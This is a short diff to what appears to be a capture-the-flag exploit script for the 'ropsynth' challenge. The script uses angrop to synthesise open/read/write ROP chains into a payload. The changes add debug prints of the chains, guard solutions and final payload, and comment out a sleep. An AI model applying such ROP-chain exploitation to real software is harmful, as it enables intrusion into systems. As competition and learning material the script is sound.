@@ -146,6 +146,9 @@ def get_gadgets():
     r = p.analyses.ROP()
     r.find_gadgets()
 
+    print("RRRRRRRRRRRRRRRRRRRr")
+    print(r)
+    print('----------------------')
     # We make three gadget chains: one to do an open, one to do a read, and one to do a write.
     # We use the range [0xa00100, 0xa00f00] as scratch space for angrop. This is mapped writeable
     # for us by the challenge binary. Also, kindly, the challenge binary pre-populates this menory
@@ -175,7 +178,21 @@ def get_gadgets():
     # We're ready! Return our post-processed chains.
     #
     final_payload = "".join(guarded_chains)
+    print ""
+    print "chains", chains
+    print ""
+    print "guarded_chains", guarded_chains
+    print ""
+    print "payload", final_payload
+    print ""
+    print "start of checks", start_of_checks
+    print ""
+    print "guard solutions"
+    for solution in guard_solutions:
+        print solution
+        print ""
     return final_payload
+
 
 def test():
     #r = pwn.remote('ropsynth.pwn.seccon.jp', 10000)
@@ -189,11 +206,12 @@ def test():
         r.stdout.read(3)
 
         # Get the gadgets
-        time.sleep(1)
+        #time.sleep(1)
         gadgets = ""
         while not gadgets.endswith('\n'):
             gadgets += r.stdout.read(1)
         gadgets = gadgets.strip()
+        #print "found gadget:", gadgets
 
         # Make our franken-elf
         make_elf(gadgets)
